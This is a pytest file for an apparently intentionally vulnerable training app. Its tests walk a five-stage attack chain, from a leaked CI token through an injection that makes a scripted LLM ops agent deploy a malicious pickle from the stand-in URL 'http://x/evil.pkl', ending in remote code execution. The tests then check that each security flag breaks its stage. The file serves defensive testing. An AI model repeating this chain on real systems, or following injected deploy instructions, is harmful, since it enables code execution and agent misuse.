"""Proof of the capstone's central claim: five links, each the literal
precondition for the next. One test drives all five stages through the HTTP
surface in vulnerable mode and asserts the full chain passes; a parametrized
matrix then flips each of the five SEC_* flags individually and asserts each
one alone breaks the chain -- not merely overall, but at the specific stage
the flag guards.
"""
import pytest

from halcyon.llm import FinalAnswer, ToolCall

from .conftest import make_chain_client

OPS_SCRIPT = [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")]


def _run(client, chain_for, session="p1"):
    tok = chain_for(session).ci_token
    client.get("/source/blob", params={"session": session, "path": ".env.sample"})
    client.post("/internal/deploy", json={
        "session_id": session, "ci_token": tok, "artifact_url": "http://x/evil.pkl"})
    client.post("/api/ops-agent", json={"session_id": session, "message": "run the runbook"})
    return client.get("/validate/chain", params={"session": session}).json()


def test_e2e_vulnerable_full_chain_passes():
    client, _store, chain_for = make_chain_client({"HALCYON_MODE": "vulnerable"}, OPS_SCRIPT)
    result = _run(client, chain_for)
    assert result["core"] == "pass"
    assert all(result["stages"].values()), result["stages"]


@pytest.mark.parametrize("flag, broken_stage", [
    ("SEC_SECRET_SCANNING", "secret_leak_discovered"),
    ("SEC_CI_LEAST_PRIV", "misconfig_exploited"),
    ("SEC_TRUSTED_SOURCE_AUTH", "trusted_injection_fired"),
    ("SEC_ARTIFACT_VERIFICATION", "malicious_artifact_loaded"),
    ("SEC_WORKER_SANDBOX", "rce_confirmed"),
])
def test_e2e_any_single_flag_breaks_the_chain(flag, broken_stage):
    # Fresh client/store per case -- CHAIN_CORE_PASSED is durable once earned,
    # so a shared store across parametrized runs would leak a pass forward.
    client, _store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", flag: "1"}, OPS_SCRIPT)
    result = _run(client, chain_for)
    assert result["core"] == "fail"
    # Not just an overall fail -- the flag must break its own stage. Every
    # stage from the broken one onward stays unmet; stages strictly before it
    # can still fire (they don't depend on the guard that just tripped).
    assert result["stages"][broken_stage] is False, result["stages"]


def test_e2e_secure_mode_breaks_the_chain():
    client, _store, chain_for = make_chain_client({"HALCYON_MODE": "secure"}, OPS_SCRIPT)
    assert _run(client, chain_for)["core"] == "fail"
